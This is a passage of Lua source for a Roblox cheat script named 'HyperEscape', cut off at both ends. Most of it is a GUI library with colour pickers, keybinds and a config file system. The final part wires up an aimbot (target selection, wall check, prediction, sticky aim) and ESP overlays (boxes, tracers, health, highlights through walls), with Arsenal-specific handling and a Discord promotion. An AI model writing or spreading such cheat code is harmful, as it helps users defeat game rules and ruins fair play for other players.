							ColorSequenceKeypoint.new(0, Color3.new(1,0,0)), 
							ColorSequenceKeypoint.new(0.17, Color3.new(1,0,1)), 
							ColorSequenceKeypoint.new(0.33,Color3.new(0,0,1)), 
							ColorSequenceKeypoint.new(0.5,Color3.new(0,1,1)), 
							ColorSequenceKeypoint.new(0.67, Color3.new(0,1,0)), 
							ColorSequenceKeypoint.new(0.83, Color3.new(1,1,0)), 
							ColorSequenceKeypoint.new(1, Color3.new(1,0,0))
						})

						ColorPicker.pointer = Instance.new("Frame", ColorPicker.selector);
						ColorPicker.pointer.ZIndex = 101;
						ColorPicker.pointer.BackgroundColor3 = library.theme.Border;
						ColorPicker.pointer.Position = UDim2.new(0,0,0,0);
						ColorPicker.pointer.Size = UDim2.new(0,2,0,10);
						ColorPicker.pointer.BorderColor3 = library.theme.BackGround;

						if ColorPicker.flag and ColorPicker.flag ~= "" then
							library.flags[ColorPicker.flag] = ColorPicker.default;
						end

						function ColorPicker:RefreshHue()
							local x = (game.Players.LocalPlayer:GetMouse().X - ColorPicker.hue.AbsolutePosition.X) / ColorPicker.hue.AbsoluteSize.X;
							local y = (game.Players.LocalPlayer:GetMouse().Y - ColorPicker.hue.AbsolutePosition.Y) / ColorPicker.hue.AbsoluteSize.Y;
							ColorPicker.hueselectorpointer:TweenPosition(UDim2.new(math.clamp(x * ColorPicker.hue.AbsoluteSize.X, 0.5, 0.952 * ColorPicker.hue.AbsoluteSize.X) / ColorPicker.hue.AbsoluteSize.X, 0, math.clamp(y * ColorPicker.hue.AbsoluteSize.Y, 0.5, 0.885 * ColorPicker.hue.AbsoluteSize.Y) / ColorPicker.hue.AbsoluteSize.Y, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05);
							ColorPicker:Set(Color3.fromHSV(ColorPicker.color, math.clamp(x * ColorPicker.hue.AbsoluteSize.X, 0.5, 1 * ColorPicker.hue.AbsoluteSize.X) / ColorPicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * ColorPicker.hue.AbsoluteSize.Y, 0.5, 1 * ColorPicker.hue.AbsoluteSize.Y) / ColorPicker.hue.AbsoluteSize.Y)));
						end

						function ColorPicker:RefreshSelector()
							local pos = math.clamp((game.Players.LocalPlayer:GetMouse().X - ColorPicker.hue.AbsolutePosition.X) / ColorPicker.hue.AbsoluteSize.X, 0, 1);
							ColorPicker.color = 1 - pos;
							ColorPicker.pointer:TweenPosition(UDim2.new(pos, 0, 0, 0), Enum.EasingDirection.In, Enum.EasingStyle.Sine, 0.05);
							ColorPicker.hue.BackgroundColor3 = Color3.fromHSV(1 - pos, 1, 1);

							local x = (ColorPicker.hueselectorpointer.AbsolutePosition.X - ColorPicker.hue.AbsolutePosition.X) / ColorPicker.hue.AbsoluteSize.X;
							local y = (ColorPicker.hueselectorpointer.AbsolutePosition.Y - ColorPicker.hue.AbsolutePosition.Y) / ColorPicker.hue.AbsoluteSize.Y;
							ColorPicker:Set(Color3.fromHSV(ColorPicker.color, math.clamp(x * ColorPicker.hue.AbsoluteSize.X, 0.5, 1 * ColorPicker.hue.AbsoluteSize.X) / ColorPicker.hue.AbsoluteSize.X, 1 - (math.clamp(y * ColorPicker.hue.AbsoluteSize.Y, 0.5, 1 * ColorPicker.hue.AbsoluteSize.Y) / ColorPicker.hue.AbsoluteSize.Y)));
						end

						function ColorPicker:Set(value)
							local color = Color3.new(math.clamp(value.r, 0, 1), math.clamp(value.g, 0, 1), math.clamp(value.b, 0, 1));
							ColorPicker.value = color;
							if ColorPicker.flag and ColorPicker.flag ~= "" then
								library.flags[ColorPicker.flag] = color;
							end
							local clr = Color3.new(math.clamp(color.R / 1.7, 0, 1), math.clamp(color.G / 1.7, 0, 1), math.clamp(color.B / 1.7, 0, 1));
							ColorPicker.Indicator.BackgroundColor3 = color;
							pcall(ColorPicker.callback, color);
						end

						function ColorPicker:Get(value)
							return ColorPicker.value;
						end
						ColorPicker:Set(ColorPicker.default);

						local dragging_selector = false;
						local dragging_hue = false;

						ColorPicker.selector.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging_selector = true;
								ColorPicker:RefreshSelector();
							end
						end)

						ColorPicker.selector.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging_selector = false;
								ColorPicker:RefreshSelector();
							end
						end)

						ColorPicker.hue.InputBegan:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging_hue = true;
								ColorPicker:RefreshHue();
							end
						end)

						ColorPicker.hue.InputEnded:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								dragging_hue = false;
								ColorPicker:RefreshHue();
							end
						end)

						game:GetService("UserInputService").InputChanged:Connect(function(input)
							if dragging_selector and input.UserInputType == Enum.UserInputType.MouseMovement then
								ColorPicker:RefreshSelector();
							end
							if dragging_hue and input.UserInputType == Enum.UserInputType.MouseMovement then
								ColorPicker:RefreshHue();
							end
						end)

						local inputBegan = function(input)
							if input.UserInputType == Enum.UserInputType.MouseButton1 then
								for i,v in pairs(window.OpenedColorPickers) do
									if v and i ~= ColorPicker.MainPicker then
										i.Visible = false;
										window.OpenedColorPickers[i] = false;
									end
								end

								ColorPicker.MainPicker.Visible = not ColorPicker.MainPicker.Visible;
								window.OpenedColorPickers[ColorPicker.MainPicker] = ColorPicker.MainPicker.Visible;
							end
						end

						ColorPicker.MainBack.InputBegan:Connect(inputBegan);
						ColorPicker.MainPicker.InputBegan:Connect(inputBegan);
						ColorPicker.MainPicker.InputBegan:Connect(inputBegan);
						
						Sector:FixSize();
						table.insert(library.items, ColorPicker);
						return ColorPicker;
					end

					function Sector:CreateKeyBind(Text, Default, CallBack,  Flag)
						local keybind = { };
						keybind.text = Text or "";
						keybind.default = Default or "None";
						keybind.value = keybind.default;
						keybind.callback = CallBack or function() end;
						keybind.flag = Flag or Text or "";

						local shorter_keycodes = {
							["LeftShift"] = "LSHIFT",
							["RightShift"] = "RSHIFT",
							["LeftControl"] = "LCTRL",
							["RightControl"] = "RCTRL",
							["LeftAlt"] = "LALT",
							["RightAlt"] = "RALT"
						}

						local text = keybind.default == "None" and "None" or (shorter_keycodes[keybind.default.Name] or keybind.default.Name)

						keybind.MainBack = Instance.new("TextButton", Sector.Items);
						keybind.MainBack.BackgroundColor3 = library.theme.BackGround;
						keybind.MainBack.AutoButtonColor = false;
						keybind.MainBack.Size = UDim2.fromOffset(240, 35);
						keybind.MainBack.Text = "";

						keybind.UICorner = Instance.new("UICorner", keybind.MainBack);
						keybind.UICorner.CornerRadius = UDim.new(0,8);

						keybind.TextLabel = Instance.new("TextLabel", keybind.MainBack);
						keybind.TextLabel.Text = keybind.text;
						keybind.TextLabel.BackgroundTransparency = 1;
						keybind.TextLabel.TextColor3 = library.theme.TextColor;
						keybind.TextLabel.TextSize = library.theme.TextSize;
						keybind.TextLabel.Font = library.theme.Font;
						keybind.TextLabel.Size = UDim2.fromOffset(125, 35);
						keybind.TextLabel.Position = UDim2.fromScale(0.046, 0);
						keybind.TextLabel.TextXAlignment = Enum.TextXAlignment.Left;

						keybind.Main = Instance.new("TextButton", keybind.MainBack);
						keybind.Main.BorderSizePixel = 0;
						keybind.Main.BackgroundColor3 = library.theme.Toggle;
						keybind.Main.Size = UDim2.fromOffset(109, 18);
						keybind.Main.Position = UDim2.fromScale(0.496, 0.229);
						keybind.Main.Text = text;
						keybind.Main.Font = library.theme.Font;
						keybind.Main.TextColor3 = library.theme.TextColor;
						keybind.Main.TextSize = library.theme.TextSize;
						keybind.Main.TextXAlignment = Enum.TextXAlignment.Center;
						keybind.Main.MouseButton1Down:Connect(function()
							keybind.Main.Text = "...";
						end)

						if keybind.flag and keybind.flag ~= "" then
							library.flags[keybind.flag] = keybind.default;
						end

						function keybind:Set(key)
							if key == "None" then
								keybind.Main.Text = key ;
								keybind.value = key;
								if keybind.flag and keybind.flag ~= "" then
									library.flags[keybind.flag] = key;
								end
							end
							keybind.Main.Text = (shorter_keycodes[key.Name] or key.Name);
							keybind.value = key;
							if keybind.flag and keybind.flag ~= "" then
								library.flags[keybind.flag] = keybind.value;
							end
						end

						function keybind:Get()
							return keybind.value;
						end

						game:GetService("UserInputService").InputBegan:Connect(function(input, gameProcessed)
							if not gameProcessed then
								if keybind.Main.Text == "..." then
									if input.UserInputType == Enum.UserInputType.Keyboard and input.KeyCode ~= Enum.KeyCode.Backspace then
										keybind:Set(input.KeyCode);
										pcall(keybind.callback, keybind.value);
									else
										keybind:Set("None");
									end
								end
							end
						end)

						Sector:FixSize();
						table.insert(library.items, keybind);
						return keybind;
					end

					function Sector:CreateCoppyText(Text)
						local CoppyText = { };

						CoppyText.MainBack = Instance.new("TextButton", Sector.Items);
						CoppyText.MainBack.BackgroundColor3 = library.theme.BackGround;
						CoppyText.MainBack.AutoButtonColor = false;
						CoppyText.MainBack.Size = UDim2.fromOffset(240, 35);
						CoppyText.MainBack.Text = "";

						CoppyText.UICorner = Instance.new("UICorner", CoppyText.MainBack);
						CoppyText.UICorner.CornerRadius = UDim.new(0,8);

						CoppyText.TextLabel = Instance.new("TextBox", CoppyText.MainBack);
						CoppyText.TextLabel.Text = Text;
						CoppyText.TextLabel.ClearTextOnFocus = false;
						CoppyText.TextLabel.Interactable = true;
						CoppyText.TextLabel.TextEditable = false;
						CoppyText.TextLabel.Active = false;
						CoppyText.TextLabel.BackgroundTransparency = 1;
						CoppyText.TextLabel.TextColor3 = library.theme.TextColor;
						CoppyText.TextLabel.TextSize = library.theme.TextSize;
						CoppyText.TextLabel.Font = library.theme.Font;
						CoppyText.TextLabel.Size = UDim2.fromOffset(240, 35);
						CoppyText.TextLabel.Position = UDim2.fromScale(0, 0);
						CoppyText.TextLabel.TextXAlignment = Enum.TextXAlignment.Center;

						Sector:FixSize();
						table.insert(library.items, CoppyText);
						return CoppyText;
					end

					function Sector:CreateLable(Text)
						local Lable = { };

						Lable.MainBack = Instance.new("TextButton", Sector.Items);
						Lable.MainBack.BackgroundColor3 = library.theme.BackGround;
						Lable.MainBack.AutoButtonColor = false;
						Lable.MainBack.Size = UDim2.fromOffset(240, 35);
						Lable.MainBack.Text = "";

						Lable.UICorner = Instance.new("UICorner", Lable.MainBack);
						Lable.UICorner.CornerRadius = UDim.new(0,8);

						Lable.TextLabel = Instance.new("TextLabel", Lable.MainBack);
						Lable.TextLabel.Text = Lable.text;
						Lable.TextLabel.BackgroundTransparency = 1;
						Lable.TextLabel.TextColor3 = library.theme.TextColor;
						Lable.TextLabel.TextSize = library.theme.TextSize;
						Lable.TextLabel.Font = library.theme.Font;
						Lable.TextLabel.Size = UDim2.fromOffset(125, 35);
						Lable.TextLabel.Position = UDim2.fromScale(0.046, 0);
						Lable.TextLabel.TextXAlignment = Enum.TextXAlignment.Left;

						Sector:FixSize();
						table.insert(library.items, Lable);
						return Lable;
					end

					function Sector:CreateTextBox(Text, Default, Callback, Flag)
						local TextBox = { };
						TextBox.text = Text or "";
						TextBox.callback = Callback or function() end;
						TextBox.default = Default;
						TextBox.value = "";
						TextBox.flag = Flag or Text or "";

						TextBox.MainBack = Instance.new("TextButton", Sector.Items);
						TextBox.MainBack.BackgroundColor3 = library.theme.BackGround;
						TextBox.MainBack.AutoButtonColor = false;
						TextBox.MainBack.Size = UDim2.fromOffset(240, 35);
						TextBox.MainBack.Text = "";

						TextBox.UICorner = Instance.new("UICorner", TextBox.MainBack);
						TextBox.UICorner.CornerRadius = UDim.new(0,8);

						TextBox.TextLabel = Instance.new("TextLabel", TextBox.MainBack);
						TextBox.TextLabel.Text = TextBox.text;
						TextBox.TextLabel.BackgroundTransparency = 1;
						TextBox.TextLabel.TextColor3 = library.theme.TextColor;
						TextBox.TextLabel.TextSize = library.theme.TextSize;
						TextBox.TextLabel.Font = library.theme.Font;
						TextBox.TextLabel.Size = UDim2.fromOffset(125, 35);
						TextBox.TextLabel.Position = UDim2.fromScale(0.046, 0);
						TextBox.TextLabel.TextXAlignment = Enum.TextXAlignment.Left;

						TextBox.Main = Instance.new("TextBox", TextBox.MainBack);
						TextBox.Main.Position = UDim2.fromScale(0.496, 0.229);
						TextBox.Main.Size = UDim2.fromOffset(109, 18);
						TextBox.Main.BackgroundColor3 = library.theme.Toggle;
						TextBox.Main.BorderSizePixel = 0;
						TextBox.Main.Text = "";
						TextBox.Main.TextColor3 = library.theme.TextColor;
						TextBox.Main.Font = library.theme.Font;
						TextBox.Main.TextSize = library.theme.TextSize;
						TextBox.Main.ClearTextOnFocus = false;

						if TextBox.flag and TextBox.flag ~= "" then
							library.flags[TextBox.flag] = TextBox.default or ""
						end

						function TextBox:Set(text)
							TextBox.value = text
							TextBox.Main.Text = text
							if TextBox.flag and TextBox.flag ~= "" then
								library.flags[TextBox.flag] = text
							end
							pcall(TextBox.callback, text)
						end

						function TextBox:Get()
							return TextBox.value
						end

						if TextBox.default then 
							TextBox:Set(TextBox.default)
						end

						TextBox.Main.FocusLost:Connect(function()
							TextBox:Set(TextBox.Main.Text)
						end)

						Sector:FixSize();
						table.insert(library.items, TextBox);
						return TextBox;
					end

					function Sector:CreateButton(Text, Callback)
						local Button = { };
						Button.text = Text or ""
						Button.callback = Callback or function() end

						Button.MainBack = Instance.new("TextButton", Sector.Items);
						Button.MainBack.BackgroundColor3 = library.theme.BackGround;
						Button.MainBack.AutoButtonColor = false;
						Button.MainBack.Size = UDim2.fromOffset(240, 35);
						Button.MainBack.Text = "";
						Button.MainBack.Text = Button.text;
						Button.MainBack.Font = library.theme.Font;
						Button.MainBack.TextColor3 = library.theme.TextColor;
						Button.MainBack.TextSize = library.theme.TextSize;
						Button.MainBack.MouseButton1Click:Connect(Button.callback);

						Button.UICorner = Instance.new("UICorner", Button.MainBack);
						Button.UICorner.CornerRadius = UDim.new(0,8);

						Sector:FixSize();
						return Button;
					end

					return Sector;
				end


				function tab:CreateConfig(side) 
					local ConfigSystem = { };

					ConfigSystem.configFolder = window.name;
					
					pcall(function()
						if isfolder and makefolder and listfiles and writefile and readfile and delfile then

							if (not isfolder(ConfigSystem.configFolder)) then
								makefolder(ConfigSystem.configFolder)
							end

							ConfigSystem.sector = tab:CreateSector("Configs", side or "left");

							local ConfigName = ConfigSystem.sector:CreateTextBox("Config Name", "", ConfigName, function() end, "");
							local default = tostring(listfiles(ConfigSystem.configFolder)[1] or ""):gsub(ConfigSystem.configFolder .. "\\", ""):gsub(".txt", "");
							local Config = ConfigSystem.sector:CreateDropDown("Configs", {}, default, false, function() end, "");
							for i,v in pairs(listfiles(ConfigSystem.configFolder)) do
								if v:find(".txt") then
									Config:Add(tostring(v):gsub(ConfigSystem.configFolder .. "\\", ""):gsub(".txt", ""));
								end
							end

							ConfigSystem.Create = ConfigSystem.sector:CreateButton("Create", function()
								for i,v in pairs(listfiles(ConfigSystem.configFolder)) do
									Config:Remove(tostring(v):gsub(ConfigSystem.configFolder .. "\\", ""):gsub(".txt", ""));
								end

								if ConfigName:Get() and ConfigName:Get() ~= "" then
									local config = {};

									for i,v in pairs(library.flags) do
										if (v ~= nil and v ~= "") then
											if (typeof(v) == "Color3") then
												config[i] = { v.R, v.G, v.B };
											elseif (tostring(v):find("Enum.KeyCode")) then
												config[i] = v.Name
											elseif (typeof(v) == "table") then
												config[i] = { v };
											else
												config[i] = v;
											end
										end
									end

									writefile(ConfigSystem.configFolder .. "/" .. ConfigName:Get() .. ".txt", httpservice:JSONEncode(config));

									for i,v in pairs(listfiles(ConfigSystem.configFolder)) do
										if v:find(".txt") then
											Config:Add(tostring(v):gsub(ConfigSystem.configFolder .. "\\", ""):gsub(".txt", ""));
										end
									end
								end
							end)

							ConfigSystem.Save = ConfigSystem.sector:CreateButton("Save", function()
								local config = {}
								if Config:Get() and Config:Get() ~= "" then
									for i,v in pairs(library.flags) do
										if (v ~= nil and v ~= "") then
											if (typeof(v) == "Color3") then
												config[i] = { v.R, v.G, v.B };
											elseif (tostring(v):find("Enum.KeyCode")) then
												config[i] = "Enum.KeyCode." .. v.Name;
											elseif (typeof(v) == "table") then
												config[i] = { v };
											else
												config[i] = v;
											end
										end
									end

									writefile(ConfigSystem.configFolder .. "/" .. ConfigName:Get() .. ".txt", httpservice:JSONEncode(config))
								end
							end)

							ConfigSystem.Load = ConfigSystem.sector:CreateButton("Load", function()
								local Success = pcall(readfile, ConfigSystem.configFolder .. "/" .. Config:Get() .. ".txt");
								if (Success) then
									pcall(function() 
										local ReadConfig = httpservice:JSONDecode(readfile(ConfigSystem.configFolder .. "/" .. Config:Get() .. ".txt"));
										local NewConfig = {};

										for i,v in pairs(ReadConfig) do
											if (typeof(v) == "table") then
												if (typeof(v[1]) == "number") then
													NewConfig[i] = Color3.new(v[1], v[2], v[3]);
												elseif (typeof(v[1]) == "table") then
													NewConfig[i] = v[1];
												end
											elseif (tostring(v):find("Enum.KeyCode.")) then
												NewConfig[i] = Enum.KeyCode[tostring(v):gsub("Enum.KeyCode.", "")];
											else
												NewConfig[i] = v;
											end
										end

										library.flags = NewConfig;

										for i,v in pairs(library.flags) do
											for i2,v2 in pairs(library.items) do
												if (i ~= nil and i ~= "" and i ~= "Configs_Name" and i ~= "Configs" and v2.flag ~= nil) then
													if (v2.flag == i) then
														pcall(function() 
															v2:Set(v);
														end)
													end
												end
											end
										end
									end)
								end
							end)

							ConfigSystem.Delete = ConfigSystem.sector:CreateButton("Delete", function()
								for i,v in pairs(listfiles(ConfigSystem.configFolder)) do
									Config:Remove(tostring(v):gsub(ConfigSystem.configFolder .. "\\", ""):gsub(".txt", ""));
								end

								if (not Config:Get() or Config:Get() == "") then return end
								if (not isfile(ConfigSystem.configFolder .. "/" .. Config:Get() .. ".txt")) then return; end;
								delfile(ConfigSystem.configFolder .. "/" .. Config:Get() .. ".txt");

								for i,v in pairs(listfiles(ConfigSystem.configFolder)) do
									if v:find(".txt") then
										Config:Add(tostring(v):gsub(ConfigSystem.configFolder .. "\\", ""):gsub(".txt", ""));
									end;
								end;
							end);
						else
							ConfigSystem.sector = tab:CreateSector("Configs", side or "left");
							ConfigSystem.sector:CreateLable("X");
						end
					end)

					return ConfigSystem;
				end

				table.insert(window.Tabs, tab)
				return tab;
			end

			return window;
		end

		return library;
	end
	
	local IsArsenal = false;
	if game.PlaceId == 286090429 then
		IsArsenal = true;
	end

	local DeleteMobLib = library();

	local Window = DeleteMobLib:CreateWindow(HyperEscape.GUI.GUIToggleKey, "");
	local UIToggle = Window:CreateToggleButton()

	local AimBotTab = Window:CreateTab("Aim Bot");
	local MainSector = AimBotTab:CreateSector("Main", "Left");
	MainSector:CreateToggle("Enable", HyperEscape.AimBot.Enabled, function(AE) HyperEscape.AimBot.Enabled = AE; end);
	MainSector:CreateToggle("Team Check", HyperEscape.AimBot.TeamCheck, function(ATC) HyperEscape.AimBot.TeamCheck = ATC; end);
	MainSector:CreateToggle("Wall Check", HyperEscape.AimBot.WallCheck, function(AWC) HyperEscape.AimBot.WallCheck = AWC ;end);
	MainSector:CreateDropDown("Hit Scan", {"Head", "HumanoidRootPart"}, HyperEscape.AimBot.AimPart, false, function(AHS) HyperEscape.AimBot.AimPart = AHS; end);

	local FovSecor = AimBotTab:CreateSector("FOV Circle", "Left");
	FovSecor:CreateToggle("Show Fov", HyperEscape.AimBot.ShowFov, function(AFE) HyperEscape.AimBot.ShowFov = AFE; end);
	FovSecor:CreateSlider("Circle Radius", 0, HyperEscape.AimBot.Fov, 1500, 1, function(FCR) HyperEscape.AimBot.Fov = FCR; end);

	local OtherSector = AimBotTab:CreateSector("Other", "Right");
	OtherSector:CreateToggle("Prediction", HyperEscape.AimBot.Prediction, function(APE) HyperEscape.AimBot.Prediction = APE; end);
	OtherSector:CreateSlider("Prediction Ammount", 100, HyperEscape.AimBot.PredictionAmmount * 100, 1000, 1, function(APA) HyperEscape.AimBot.PredictionAmmount = APA / 100; end);
	OtherSector:CreateToggle("Sticky Aim", HyperEscape.AimBot.StickyAim, function(ASAE) HyperEscape.AimBot.StickyAim = ASAE; end);
	OtherSector:CreateSlider("Smoothing", 3, HyperEscape.AimBot.Smoothing * 100, 50, 1, function(AS) HyperEscape.AimBot.Smoothing = AS / 100; end);
	OtherSector:CreateKeyBind("Key Bind", HyperEscape.AimBot.Keybind, function(AK) HyperEscape.AimBot.Keybind = AK; end);
	OtherSector:CreateToggle("Use Mouse", HyperEscape.AimBot.UseMouse, function(AUM) HyperEscape.AimBot.UseMouse = AUM; end);
	OtherSector:CreateDropDown("Mouse Bind", {"MouseButton1", "MouseButton2"}, HyperEscape.AimBot.MouseBind, false, function(AMB) HyperEscape.AimBot.MouseBind = AMB; end);

	local ESPTab = Window:CreateTab("ESP");
	local EnableSector = ESPTab:CreateSector("ESP", "Left");
	EnableSector:CreateToggle("Enable", HyperEscape.esp.Enabled, function(EE) HyperEscape.esp.Enabled = EE; end);
	EnableSector:CreateToggle("Team Check", HyperEscape.esp.Box.TeamCheck, function(ETC) HyperEscape.esp.TeamCheck = ETC; end);
	EnableSector:CreateToggle("Box", HyperEscape.esp.Box.Box, function(EB) HyperEscape.esp.Box.Box = EB; end);
	EnableSector:CreateToggle("Tracer", HyperEscape.esp.Tracer.Tracer, function(ET) HyperEscape.esp.Tracer.Tracer = ET; end);
	EnableSector:CreateToggle("Health", HyperEscape.esp.Box.Health, function(EH) HyperEscape.esp.Box.Health = EH; end);
	EnableSector:CreateToggle("Name", HyperEscape.esp.Box.Name, function(EN) HyperEscape.esp.Box.Name = EN; end);
	EnableSector:CreateToggle("Distance", HyperEscape.esp.Box.Distance, function(ED) HyperEscape.esp.Box.Distance = ED; end);
	EnableSector:CreateToggle("Health Bar", HyperEscape.esp.Box.HealthBar, function(EHB) HyperEscape.esp.Box.HealthBar = EHB; end);
	if not IsArsenal then
		EnableSector:CreateToggle("Hilights", HyperEscape.esp.Hilights.Hilights, function(EHi) HyperEscape.esp.Hilights.Hilights = EHi; end);
		EnableSector:CreateToggle("Show Hilight Through Walls", HyperEscape.esp.Hilights.AllWaysVisible, function(ESHTW) HyperEscape.esp.Hilights.AllWaysVisible = ESHTW; end);
	end

	local ESPSettingsSecor = ESPTab:CreateSector("Settings", "Right");
	ESPSettingsSecor:CreateSlider("Max Distance", 0, HyperEscape.esp.MaxDistance, 4000, 1, function(EMD) HyperEscape.esp.MaxDistance = EMD; end);
	ESPSettingsSecor:CreateToggle("Outlines", HyperEscape.esp.Box.Outline, function(ESO) HyperEscape.esp.Box.Outline = ESO; HyperEscape.esp.Tracer.Outline = ESO; end);
	ESPSettingsSecor:CreateColorPicker("Outline Color", HyperEscape.esp.Box.OutlineColor, function(EOC) HyperEscape.esp.Box.OutlineColor = EOC; HyperEscape.esp.Tracer.OutlineColor = EOC; end);
	ESPSettingsSecor:CreateColorPicker("ESP Color", HyperEscape.esp.Box.Color, function(EEC) HyperEscape.esp.Box.Color = EEC; HyperEscape.esp.Tracer.Color = EEC; end);
	if not IsArsenal then
		ESPSettingsSecor:CreateColorPicker("Hilight Outline", HyperEscape.esp.Hilights.OutlineColor, function(EOCC) HyperEscape.esp.Hilights.OutlineColor = EOCC; end);
		ESPSettingsSecor:CreateColorPicker("Hilight Fill", HyperEscape.esp.Hilights.FillColor, function(EFCC) HyperEscape.esp.Hilights.FillColor = EFCC; end);
		ESPSettingsSecor:CreateSlider("Hilight Outline", 0, HyperEscape.esp.Hilights.OutlineTransparency * 100, 100, 1, function(EHOT) HyperEscape.esp.Hilights.OutlineTransparency = EHOT / 100; end);
		ESPSettingsSecor:CreateSlider("Hilight Fill", 0, HyperEscape.esp.Hilights.FillTransparency * 100, 100, 1, function(EHFT) HyperEscape.esp.Hilights.FillTransparency = EHFT / 100; end);
	end

	local SettingsTab = Window:CreateTab("Settings");
	local SettingsInfoSector = SettingsTab:CreateSector("Info", "Left");
	SettingsInfoSector:CreateCoppyText("@ x01337");
	SettingsInfoSector:CreateCoppyText(".gg/publicxenemy");

	SettingsTab:CreateConfig("Right");

	local SettingsSettings = SettingsTab:CreateSector("GUI Settigns", "Left");
	SettingsSettings:CreateToggle("UI Toggle Button", HyperEscape.GUI.GUIButton, function(GUITB) HyperEscape.GUI.GUIButton = GUITB; UIToggle:Update(GUITB); end);
	SettingsSettings:CreateKeyBind("UI Key Bind", HyperEscape.GUI.GUIToggleKey, function(SUITK) HyperEscape.GUI.GUIToggleKey = SUITK; Window:UpdateKeyBind(SUITK); end);


	local ESPHolder = Instance.new("Folder", (CoreGui or localPlayer.PlayerGui)); 
	local Fov = Instance.new("ScreenGui",(CoreGui or localPlayer.PlayerGui))Fov.Name = "" Fov.ZIndexBehavior = Enum.ZIndexBehavior.Sibling Fov.ResetOnSpawn = false; -- Yapee
	local FOVFFrame = Instance.new("Frame")FOVFFrame.Parent = Fov FOVFFrame.Name = "" FOVFFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255) FOVFFrame.BorderColor3 = Color3.fromRGB(0, 0, 0) FOVFFrame.BorderSizePixel = 0 FOVFFrame.BackgroundTransparency = 1 FOVFFrame.AnchorPoint = Vector2.new(0.5, 0.5) FOVFFrame.Position = UDim2.new(0.5, 0,0.5, 0) FOVFFrame.Size = UDim2.new(0, HyperEscape.AimBot.Fov, 0, HyperEscape.AimBot.Fov) FOVFFrame.BackgroundTransparency = 1;
	local UICorner = Instance.new("UICorner")UICorner.CornerRadius = UDim.new(1, 0) UICorner.Parent = FOVFFrame;
	local UIStroke = Instance.new("UIStroke")UIStroke.Color = Color3.fromRGB(100,0,100) UIStroke.Parent = FOVFFrame UIStroke.Thickness = 1 UIStroke.ApplyStrokeMode = "Border"; game:GetService("StarterGui"):SetCore("SendNotification", {Title = "@ htrbxi", Text = "@ .gg/publicxenemy"});

	local function IsAlive(Player)
		if Player and Player.Character and Player.Character:FindFirstChild("HumanoidRootPart") ~= nil and Player.Character:FindFirstChild("Humanoid") ~= nil and (IsArsenal and players[Player.Character.Name].NRPBS["Health"].Value > 0 or not IsArsenal and Player.Character.Humanoid.Health > 0) then
			return true
		end
		return false
	end

	local function GetTeam(Player)
		if not game.Players.LocalPlayer.Neutral then
			return game.Teams[Player.Team.Name];
		end
		return true;
	end

	function isVisible(p, ...)

		if not (HyperEscape.AimBot.WallCheck == true) then
			return true;
		end

		return #CurrentCamera:GetPartsObscuringTarget({ p }, { CurrentCamera, localPlayer.Character, ... }) == 0;
	end

	function CameraGetClosestToMouse()
		local AimFov = HyperEscape.AimBot.Fov;
		local targetPos = nil;

		for i,v in pairs (game:GetService("Players"):GetPlayers()) do
			if v ~= localPlayer then
				if HyperEscape.AimBot.TeamCheck ~= true or GetTeam(v) ~= GetTeam(localPlayer) then 
					if IsAlive(v) then
						local screen_pos, on_screen = CurrentCamera:WorldToViewportPoint(v.Character[HyperEscape.AimBot.AimPart].Position)
						local screen_pos_2D = Vector2.new(screen_pos.X, screen_pos.Y)
						local new_magnitude = (screen_pos_2D - mouseLocation(UIS)).Magnitude
						if on_screen and new_magnitude < AimFov and isVisible(v.Character[HyperEscape.AimBot.AimPart].Position, v.Character.Head.Parent) then
							AimFov = new_magnitude;
							targetPos = v;
						end
					end
				end
			end
		end
		return targetPos;
	end

	local function LoadESP(Player) -- I Thought It Would Be Harder To Make, Idk Why
		local PlayerESP = Instance.new("Folder", ESPHolder);
		PlayerESP.Name = Player.Name .. "ESP";
		-- Box
		local BoxHolder = Instance.new("ScreenGui", PlayerESP);
		BoxHolder.Name = "";
		BoxHolder.DisplayOrder = 2;

		local TracerHolder = Instance.new("ScreenGui", PlayerESP);
		TracerHolder.Name = "";

		local HilightHolder = Instance.new("Folder", PlayerESP);
		HilightHolder.Name = ""

		local LeftOutline = Instance.new("Frame", BoxHolder);
		LeftOutline.BackgroundColor3 = HyperEscape.esp.Box.OutlineColor;
		LeftOutline.Visible = false;
		LeftOutline.BorderSizePixel = 1;

		local RightOutline = Instance.new("Frame", BoxHolder);
		RightOutline.BackgroundColor3 = HyperEscape.esp.Box.OutlineColor;
		RightOutline.Visible = false;
		RightOutline.BorderSizePixel = 1;

		local TopOutline = Instance.new("Frame", BoxHolder);
		TopOutline.BackgroundColor3 = HyperEscape.esp.Box.OutlineColor;
		TopOutline.Visible = false;
		TopOutline.BorderSizePixel = 1;

		local BottomOutline = Instance.new("Frame", BoxHolder);
		BottomOutline.BackgroundColor3 = HyperEscape.esp.Box.OutlineColor;
		BottomOutline.Visible = false;
		BottomOutline.BorderSizePixel = 1;

		local Left = Instance.new("Frame", BoxHolder);
		Left.BackgroundColor3 = HyperEscape.esp.Box.Color;
		Left.Visible = false;
		Left.BorderSizePixel = 0;

		local Right = Instance.new("Frame", BoxHolder);
		Right.BackgroundColor3 = HyperEscape.esp.Box.Color;
		Right.Visible = false;
		Right.BorderSizePixel = 0;

		local Top = Instance.new("Frame", BoxHolder);
		Top.BackgroundColor3 = HyperEscape.esp.Box.Color;
		Top.Visible = false;
		Top.BorderSizePixel = 0;

		local Bottom = Instance.new("Frame", BoxHolder);
		Bottom.BackgroundColor3 = HyperEscape.esp.Box.Color;
		Bottom.Visible = false;
		Bottom.BorderSizePixel = 0;

		local Name = Instance.new("TextLabel", BoxHolder);
		Name.BackgroundTransparency = 1;
		Name.Text = Player.Name;
		Name.Visible = false;
		Name.AnchorPoint = Vector2.new(0.5, 0.5);
		Name.TextSize = 12;
		Name.Font = 2;
		Name.TextColor3 = Color3.fromRGB(255, 255, 255);
		Name.TextStrokeTransparency = 0;

		local Distance = Instance.new("TextLabel", BoxHolder);
		Distance.BackgroundTransparency = 1;
		if IsAlive(Player) then
			Distance.Text = math.floor(0.5+(CurrentCamera.CFrame.Position - Player.Character.HumanoidRootPart.Position).magnitude);
		end
		Distance.Visible = false;
		Distance.AnchorPoint = Vector2.new(0.5, 0.5);
